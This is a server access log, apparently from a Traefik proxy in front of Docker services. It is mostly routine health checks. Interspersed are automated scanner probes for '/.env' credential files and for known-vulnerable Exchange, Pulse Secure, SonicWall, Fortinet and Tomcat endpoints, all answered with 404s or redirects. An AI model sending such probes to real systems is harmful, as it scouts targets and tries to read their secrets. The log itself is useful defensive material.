167.71.120.76 - - [21/Dec/2023:01:41:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3670 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:01:42:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3671 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:01:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3672 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:01:43:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3673 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:43:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3674 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:01:44:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3675 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:01:44:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3676 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:01:45:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3677 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3678 "www@docker" "http://172.20.0.9:80" 3ms
159.203.109.206 - - [21/Dec/2023:01:46:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3679 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:46:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3680 "www@docker" "http://172.20.0.9:80" 1ms
172.105.128.11 - - [21/Dec/2023:01:46:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3681 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:01:47:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3682 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:01:47:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3683 "www@docker" "http://172.20.0.9:80" 1ms
51.254.49.99 - - [21/Dec/2023:01:48:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3684 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:01:48:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3685 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:48:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3686 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:01:49:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3687 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3688 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:01:50:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3689 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:50:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3690 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:01:51:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3691 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:51:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3692 "www@docker" "http://172.20.0.9:80" 0ms
54.37.79.75 - - [21/Dec/2023:01:51:57 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3693 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [21/Dec/2023:01:51:58 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3694 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:01:52:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3695 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:52:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3696 "www@docker" "http://172.20.0.9:80" 0ms
45.33.94.202 - - [21/Dec/2023:01:53:01 +0000] "GET /owa/auth/errorFE.aspx?httpCode=500 HTTP/2.0" 404 19 "-" "-" 3697 "-" "-" 0ms
45.33.94.202 - - [21/Dec/2023:01:53:01 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/2.0" 404 19 "-" "-" 3698 "-" "-" 0ms
45.33.94.202 - - [21/Dec/2023:01:53:01 +0000] "GET /owa/auth/logon.aspx HTTP/2.0" 404 19 "-" "-" 3699 "-" "-" 0ms
173.230.149.61 - - [21/Dec/2023:01:53:17 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 3700 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:01:53:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3701 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3702 "www@docker" "http://172.20.0.9:80" 0ms
23.239.9.159 - - [21/Dec/2023:01:53:43 +0000] "GET /api/v1 HTTP/1.1" 404 19 "-" "-" 3703 "-" "-" 0ms
23.239.9.159 - - [21/Dec/2023:01:53:43 +0000] "GET /api/v1 HTTP/1.1" 404 19 "-" "-" 3704 "-" "-" 0ms
104.248.191.85 - - [21/Dec/2023:01:53:58 +0000] "POST /v1/statement HTTP/1.1" 404 19 "-" "-" 3705 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:01:54:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3706 "www@docker" "http://172.20.0.9:80" 0ms
137.184.194.6 - - [21/Dec/2023:01:54:20 +0000] "GET /dana-cached/hc/HostCheckerInstaller.osx HTTP/2.0" 404 19 "-" "-" 3707 "-" "-" 0ms
137.184.194.6 - - [21/Dec/2023:01:54:20 +0000] "GET /dana-na/nc/nc_gina_ver.txt HTTP/2.0" 404 19 "-" "-" 3708 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:01:54:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3709 "www@docker" "http://172.20.0.9:80" 1ms
45.33.94.144 - - [21/Dec/2023:01:54:34 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 3710 "-" "-" 0ms
45.33.94.144 - - [21/Dec/2023:01:54:34 +0000] "GET /Remote HTTP/2.0" 404 19 "-" "-" 3711 "-" "-" 0ms
45.33.94.144 - - [21/Dec/2023:01:54:34 +0000] "GET /RDWeb HTTP/2.0" 404 19 "-" "-" 3712 "-" "-" 0ms
24.144.112.174 - - [21/Dec/2023:01:54:49 +0000] "POST /wsman HTTP/2.0" 404 19 "-" "-" 3713 "-" "-" 0ms
167.99.168.50 - - [21/Dec/2023:01:55:12 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 3714 "-" "-" 0ms
167.99.168.50 - - [21/Dec/2023:01:55:12 +0000] "GET /auth.html HTTP/2.0" 404 19 "-" "-" 3715 "-" "-" 0ms
167.99.168.50 - - [21/Dec/2023:01:55:12 +0000] "GET /auth1.html HTTP/2.0" 404 19 "-" "-" 3716 "-" "-" 0ms
167.99.168.50 - - [21/Dec/2023:01:55:12 +0000] "GET /api/sonicos/auth HTTP/2.0" 404 19 "-" "-" 3717 "-" "-" 0ms
167.99.168.50 - - [21/Dec/2023:01:55:12 +0000] "GET /api/sonicos/tfa HTTP/2.0" 404 19 "-" "-" 3718 "-" "-" 0ms
167.99.168.50 - - [21/Dec/2023:01:55:12 +0000] "GET /sslvpnLogin.html HTTP/2.0" 404 19 "-" "-" 3719 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:01:55:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3720 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:01:55:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3721 "www@docker" "http://172.20.0.9:80" 0ms
45.33.7.203 - - [21/Dec/2023:01:56:18 +0000] "HEAD / HTTP/1.1" 404 19 "-" "-" 3722 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:01:56:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3723 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:56:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3724 "www@docker" "http://172.20.0.9:80" 1ms
45.33.7.203 - - [21/Dec/2023:01:56:39 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 3725 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:01:57:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3726 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:57:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3727 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:01:58:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3728 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:01:58:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3729 "www@docker" "http://172.20.0.9:80" 0ms
45.33.7.203 - - [21/Dec/2023:01:58:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3730 "-" "-" 0ms
45.33.7.203 - - [21/Dec/2023:01:58:56 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 3731 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:01:59:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3732 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:01:59:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3733 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:00:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3734 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:00:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3735 "www@docker" "http://172.20.0.9:80" 0ms
68.69.186.30 - - [21/Dec/2023:02:00:54 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3736 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3737 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:01:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3738 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:02:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3739 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:02:02:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3740 "www@docker" "http://172.20.0.9:80" 1ms
181.49.33.234 - - [21/Dec/2023:02:03:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3741 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3742 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:02:03:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3743 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:04:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3744 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:04:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3745 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:05:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3746 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:05:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3747 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:06:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3748 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:06:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3749 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:07:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3750 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:07:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3751 "www@docker" "http://172.20.0.9:80" 1ms
87.236.176.207 - - [21/Dec/2023:02:07:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3752 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:08:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3753 "www@docker" "http://172.20.0.9:80" 0ms
45.79.168.172 - - [21/Dec/2023:02:08:31 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3754 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:08:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3755 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [21/Dec/2023:02:08:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3756 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:09:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3757 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:09:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3758 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:10:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3759 "www@docker" "http://172.20.0.9:80" 0ms
5.196.102.71 - - [21/Dec/2023:02:10:21 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 3760 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:10:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3761 "www@docker" "http://172.20.0.9:80" 1ms
165.22.143.70 - - [21/Dec/2023:02:10:48 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 3762 "-" "-" 0ms
167.248.133.123 - - [21/Dec/2023:02:10:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3763 "-" "-" 0ms
167.248.133.123 - - [21/Dec/2023:02:10:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3764 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:11:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3765 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:02:11:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3766 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:12:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3767 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:12:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3768 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:13:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3769 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:13:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3770 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:14:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3771 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:14:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3772 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:15:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3773 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [21/Dec/2023:02:15:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3774 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:15:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3775 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:16:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3776 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:16:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3777 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:17:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3778 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:17:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3779 "www@docker" "http://172.20.0.9:80" 0ms
51.254.49.111 - - [21/Dec/2023:02:17:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3780 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:18:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3781 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [21/Dec/2023:02:18:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3782 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [21/Dec/2023:02:19:04 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3783 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [21/Dec/2023:02:19:04 +0000] "GET /logs/scripts.js?version=2 HTTP/2.0" 304 0 "-" "-" 3785 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [21/Dec/2023:02:19:04 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 3784 "logpager@docker" "http://172.20.0.3:80" 2ms
173.48.140.140 - - [21/Dec/2023:02:19:04 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1724 "-" "-" 3786 "logpager@docker" "http://172.20.0.3:80" 7ms
159.203.109.206 - - [21/Dec/2023:02:19:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3787 "www@docker" "http://172.20.0.9:80" 0ms
64.62.197.36 - - [21/Dec/2023:02:19:21 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3788 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:19:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3789 "www@docker" "http://172.20.0.9:80" 1046ms
173.48.140.140 - - [21/Dec/2023:02:19:52 +0000] "GET /logs/ HTTP/2.0" 200 1256 "-" "-" 3790 "logpager@docker" "http://172.20.0.3:80" 17ms
173.48.140.140 - - [21/Dec/2023:02:19:52 +0000] "GET /logs/styles.css HTTP/2.0" 200 1949 "-" "-" 3791 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [21/Dec/2023:02:19:52 +0000] "GET /logs/scripts.js?version=5 HTTP/2.0" 200 2859 "-" "-" 3792 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [21/Dec/2023:02:19:52 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1798 "-" "-" 3793 "logpager@docker" "http://172.20.0.3:80" 5ms
159.203.109.206 - - [21/Dec/2023:02:20:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3794 "www@docker" "http://172.20.0.9:80" 24ms
172.105.128.13 - - [21/Dec/2023:02:20:23 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3795 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:20:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3796 "www@docker" "http://172.20.0.9:80" 20ms
64.62.197.40 - - [21/Dec/2023:02:20:42 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 3797 "-" "-" 0ms
64.62.197.36 - - [21/Dec/2023:02:20:51 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 3798 "-" "-" 0ms
64.62.197.41 - - [21/Dec/2023:02:20:55 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3799 "-" "-" 0ms
64.62.197.33 - - [21/Dec/2023:02:21:08 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 3800 "-" "-" 0ms
64.62.197.41 - - [21/Dec/2023:02:21:13 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 3801 "-" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:21:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3802 "www@docker" "http://172.20.0.9:80" 0ms
64.62.197.44 - - [21/Dec/2023:02:21:27 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 3803 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:21:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3804 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:22:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3805 "www@docker" "http://172.20.0.9:80" 1ms
128.199.137.235 - - [21/Dec/2023:02:22:29 +0000] "GET /manager/html HTTP/1.1" 301 17 "-" "-" 3806 "web-to-websecure@internal" "-" 0ms
128.199.137.235 - - [21/Dec/2023:02:22:30 +0000] "GET /manager/html HTTP/1.1" 404 19 "-" "-" 3807 "-" "-" 0ms
167.71.120.76 - - [21/Dec/2023:02:22:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3808 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:23:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3809 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:23:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3810 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:24:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3811 "www@docker" "http://172.20.0.9:80" 1ms
173.48.140.140 - - [21/Dec/2023:02:24:25 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3812 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [21/Dec/2023:02:24:25 +0000] "GET /logs/styles.css HTTP/2.0" 304 0 "-" "-" 3813 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [21/Dec/2023:02:24:25 +0000] "GET /logs/scripts.js?version=5 HTTP/2.0" 304 0 "-" "-" 3814 "logpager@docker" "http://172.20.0.3:80" 0ms
173.48.140.140 - - [21/Dec/2023:02:24:25 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1844 "-" "-" 3815 "logpager@docker" "http://172.20.0.3:80" 5ms
167.71.120.76 - - [21/Dec/2023:02:24:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3816 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:25:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3817 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:25:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3818 "www@docker" "http://172.20.0.9:80" 2ms
159.203.109.206 - - [21/Dec/2023:02:26:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3819 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:26:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3820 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:27:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3821 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:27:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3822 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:28:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3823 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:28:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3824 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:29:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3825 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:29:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3826 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [21/Dec/2023:02:30:08 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3827 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [21/Dec/2023:02:30:08 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 3828 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [21/Dec/2023:02:30:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3829 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:30:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3830 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:31:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3831 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:31:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3832 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:32:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3833 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:32:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3834 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [21/Dec/2023:02:33:16 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 3835 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [21/Dec/2023:02:33:16 +0000] "GET /logs/styles.css HTTP/2.0" 304 0 "-" "-" 3836 "logpager@docker" "http://172.20.0.3:80" 1ms
173.48.140.140 - - [21/Dec/2023:02:33:16 +0000] "GET /logs/scripts.js?version=5 HTTP/2.0" 304 0 "-" "-" 3837 "logpager@docker" "http://172.20.0.3:80" 0ms
173.48.140.140 - - [21/Dec/2023:02:33:16 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1718 "-" "-" 3838 "logpager@docker" "http://172.20.0.3:80" 5ms
159.203.109.206 - - [21/Dec/2023:02:33:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3839 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [21/Dec/2023:02:33:18 +0000] "GET /logs/logtail.php?page=10 HTTP/2.0" 200 1675 "-" "-" 3840 "logpager@docker" "http://172.20.0.3:80" 54ms
173.48.140.140 - - [21/Dec/2023:02:33:21 +0000] "GET /logs/logtail.php?page=20 HTTP/2.0" 200 1674 "-" "-" 3841 "logpager@docker" "http://172.20.0.3:80" 180ms
173.48.140.140 - - [21/Dec/2023:02:33:24 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1796 "-" "-" 3842 "logpager@docker" "http://172.20.0.3:80" 4ms
173.48.140.140 - - [21/Dec/2023:02:33:26 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1779 "-" "-" 3843 "logpager@docker" "http://172.20.0.3:80" 6ms
167.71.120.76 - - [21/Dec/2023:02:33:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3844 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:34:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3845 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:34:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3846 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:35:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3847 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:35:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3848 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [21/Dec/2023:02:36:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3849 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3850 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [21/Dec/2023:02:37:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3851 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [21/Dec/2023:02:37:32 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3852 "www@docker" "http://172.20.0.9:80" 1ms
